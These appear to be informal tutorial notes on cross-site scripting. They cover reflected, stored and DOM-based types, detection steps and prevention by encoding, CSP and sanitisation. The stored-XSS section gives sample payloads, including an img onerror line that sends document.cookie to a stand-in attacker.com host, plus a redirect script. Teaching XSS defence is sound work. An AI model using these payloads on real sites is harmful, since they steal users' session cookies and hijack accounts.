so for today we are going to learn what reflected xss is 
and will follow the way we always do 


# XSS (Cross-site Scripting)

this is the type of attack that is most common type of vulnerability found in every website and it is actually harmful if opened or website is vulnerable to this 

## type of Xss
- Reflected Xss => malicious script comes from current http request 
- stored Xss => malicious script comes from the website databases 
- dom based xss => vulnerability exists in client side code rather than server-side code

### Reflected xss 
when a web app takes user input from an http request (like url) and immediately sends it back in te repsonse page without checking or cleaning it 
an attacker tricks a useer into clicking a bad link to run malicious script 

-> user input -> database fetched -> respond by the server and return the search 
-> user input -> harmful code injection -> database fetched -> no sanitation of input -> code run -> responded by the server and code run in the back 

eg: <script> alert("hello") </script> => into input box
    <script> window.location.href="hacker.login.php"</script>

### Stored xss


Stored (Persistent) XSS: malicious input is saved server-side (DB, file, queue) and later rendered to other users **without encoding** — no victim interaction needed beyond a normal page visit.

---

#### 1. Classic Payload (old-school)

```html
<script>alert(document.cookie)</script>
```
Saved raw in DB → injected via `innerHTML` / unescaped templates → executes on load.

#### 2. Modern Payload (frameworks/CSP era)

Targets attribute-breakout + event handlers, since frameworks auto-escape text bindings:

```html
"><img src=x onerror=fetch('http://attacker.com/steal?cookie='+document.cookie)>
```
Fires only when app uses an unsafe sink:
- React: `dangerouslySetInnerHTML`
- Vue: `v-html`
- Angular: `[innerHTML]` / `bypassSecurityTrustHtml`

---

#### 3. Detection Workflow

1. **Map inputs** — comments, bio, filenames, headers (`User-Agent`, `Referer`), etc.
2. **Inject canary** — `XSSCANARY123`
3. **Trace output** — check admin panels, dashboards, public feeds
4. **Test encoding** — send `< > " '` and see if they come back raw or encoded

Tools: Burp Suite Scanner, OWASP ZAP.

---

#### 4. Prevention

**Output encoding (primary defense):**

| Char | Encoded |
|------|---------|
| `<`  | `&lt;`  |
| `>`  | `&gt;`  |
| `"`  | `&quot;`|
| `'`  | `&#x27;`|

**Safe DOM APIs:**
```js
// Bad
el.innerHTML = userInput;

// Good
el.textContent = userInput;
```

**CSP header:**
```http
Content-Security-Policy: default-src 'self'; script-src 'self';
```

**Rich text needed?** Sanitize with a maintained library:
```js
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(userInput);
```

## To check if xss is possible

-> use alert() => will pop up and show /verify that xss is possible
               => version 92 on 2021 onward calling alert() is prevented on google

-> use print() => will print the whole screen and script on device or on screen as output confirm xss is possible

## Prevention 
-> santinize the input at client side and server side
-> encoded data on output
-> convert the input into text by speical character so that it dont remain a code and cant be executed as it is a text now
-> contect security policy should be used
